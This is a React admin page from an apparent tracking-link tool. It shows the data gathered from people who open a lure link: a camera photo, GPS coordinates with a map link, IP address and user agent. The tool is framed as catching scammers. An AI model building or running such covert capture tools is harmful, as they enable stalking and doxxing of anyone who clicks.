import { useParams } from "wouter";
import { format } from "date-fns";
import { AdminLayout } from "@/components/AdminLayout";
import { useLinkByToken } from "@/hooks/use-links";
import { useCaptures } from "@/hooks/use-captures";
import { 
  MapPin, 
  Clock, 
  Monitor, 
  Globe, 
  Camera, 
  AlertTriangle, 
  Map, 
  ArrowLeft,
  Image as ImageIcon
} from "lucide-react";
import { Link } from "wouter";
import { motion } from "framer-motion";

export default function LinkDetails() {
  const { token } = useParams<{ token: string }>();
  const { data: link, isLoading: isLoadingLink, error: linkError } = useLinkByToken(token || "");
  const { data: captures, isLoading: isLoadingCaptures } = useCaptures(link?.id);

  if (isLoadingLink) {
    return (
      <AdminLayout>
        <div className="flex justify-center py-20"><div className="animate-spin w-8 h-8 border-4 border-primary border-t-transparent rounded-full"></div></div>
      </AdminLayout>
    );
  }

  if (linkError || !link) {
    return (
      <AdminLayout>
        <div className="text-center py-20 text-destructive">
          <AlertTriangle className="w-12 h-12 mx-auto mb-4 opacity-50" />
          <h2 className="text-2xl font-bold">Link Not Found</h2>
          <p className="mt-2 text-muted-foreground text-sm">The tracking link you are looking for does not exist.</p>
          <Link href="/" className="inline-block mt-6 px-6 py-2 bg-white/10 rounded-lg text-white hover:bg-white/20 transition-colors">
            Back to Dashboard
          </Link>
        </div>
      </AdminLayout>
    );
  }

  return (
    <AdminLayout>
      <div className="mb-8 flex items-center justify-between">
        <div>
          <Link href="/" className="text-muted-foreground hover:text-white flex items-center gap-2 mb-4 text-sm font-medium transition-colors w-max">
            <ArrowLeft className="w-4 h-4" /> Back to List
          </Link>
          <h2 className="text-3xl font-display font-bold text-white">{link.name}</h2>
          <div className="flex items-center gap-3 mt-2 text-sm text-muted-foreground font-mono">
            <span className="bg-black/50 px-2 py-1 rounded border border-white/10 text-primary">Token: {link.token}</span>
            <span>Created: {format(new Date(link.createdAt), "PPpp")}</span>
          </div>
        </div>
      </div>

      {isLoadingCaptures ? (
        <div className="flex justify-center py-20"><div className="animate-spin w-8 h-8 border-4 border-primary border-t-transparent rounded-full"></div></div>
      ) : captures?.length === 0 ? (
        <div className="bg-card/40 border border-white/5 rounded-3xl p-16 text-center">
          <Camera className="w-12 h-12 mx-auto text-muted-foreground/50 mb-4" />
          <h3 className="text-xl font-bold text-white mb-2">No Intel Captured Yet</h3>
          <p className="text-muted-foreground max-w-md mx-auto">
            Once the target clicks the link and accepts permissions, their photo, IP, and GPS location will appear here automatically.
          </p>
        </div>
      ) : (
        <div className="grid grid-cols-1 lg:grid-cols-2 xl:grid-cols-3 gap-6">
          {captures?.map((capture, i) => (
            <motion.div 
              key={capture.id}
              initial={{ opacity: 0, scale: 0.95 }}
              animate={{ opacity: 1, scale: 1 }}
              transition={{ delay: i * 0.1 }}
              className="glass-panel rounded-2xl overflow-hidden flex flex-col"
            >
              {/* Image Header */}
              <div className="aspect-video bg-black relative border-b border-border">
                {capture.imageData ? (
                  <img 
                    src={capture.imageData} 
                    alt="Captured scammer selfie" 
                    className="w-full h-full object-cover"
                  />
                ) : (
                  <div className="flex flex-col items-center justify-center w-full h-full text-muted-foreground/40 bg-zinc-900">
                    <ImageIcon className="w-10 h-10 mb-2" />
                    <span className="text-sm font-medium">No Image</span>
                  </div>
                )}
                
                <div className="absolute top-3 right-3 bg-black/60 backdrop-blur-md px-3 py-1.5 rounded-lg border border-white/10 flex items-center gap-2 text-xs font-mono text-white shadow-xl">
                  <Clock className="w-3.5 h-3.5 text-primary" />
                  {format(new Date(capture.capturedAt), "HH:mm:ss")}
                </div>
              </div>

              {/* Data Body */}
              <div className="p-5 flex-1 flex flex-col space-y-4">
                {/* Location Box */}
                <div className="p-4 rounded-xl bg-white/5 border border-white/5 space-y-3">
                  <h4 className="text-xs font-bold text-muted-foreground uppercase tracking-wider flex items-center gap-2">
                    <MapPin className="w-4 h-4 text-accent" /> Location Data
                  </h4>
                  {capture.latitude && capture.longitude ? (
                    <>
                      <div className="font-mono text-sm text-white break-all">
                        {capture.latitude}, {capture.longitude}
                        {capture.accuracy && <span className="text-muted-foreground ml-2">(±{parseInt(capture.accuracy)}m)</span>}
                      </div>
                      <a 
                        href={`https://www.google.com/maps?q=${capture.latitude},${capture.longitude}`}
                        target="_blank"
                        rel="noreferrer"
                        className="inline-flex items-center gap-1.5 text-xs font-semibold text-primary hover:text-white transition-colors"
                      >
                        <Map className="w-3.5 h-3.5" />
                        Open in Google Maps
                      </a>
                    </>
                  ) : (
                    <div className="text-sm text-muted-foreground italic">Location denied by target</div>
                  )}
                </div>

                {/* Network & Device Info */}
                <div className="grid grid-cols-1 gap-4 text-sm text-white/80">
                  <div className="flex items-start gap-3">
                    <Globe className="w-4 h-4 text-muted-foreground shrink-0 mt-0.5" />
                    <div>
                      <span className="block text-xs text-muted-foreground font-semibold mb-0.5 uppercase tracking-wide">IP Address</span>
                      <span className="font-mono text-white">{capture.ipAddress || "Unknown"}</span>
                    </div>
                  </div>
                  
                  <div className="flex items-start gap-3">
                    <Monitor className="w-4 h-4 text-muted-foreground shrink-0 mt-0.5" />
                    <div>
                      <span className="block text-xs text-muted-foreground font-semibold mb-0.5 uppercase tracking-wide">Device / User Agent</span>
                      <span className="text-xs font-mono text-white/70 line-clamp-2 break-all" title={capture.userAgent || ""}>
                        {capture.userAgent || "Unknown"}
                      </span>
                    </div>
                  </div>
                </div>
              </div>
            </motion.div>
          ))}
        </div>
      )}
    </AdminLayout>
  );
}
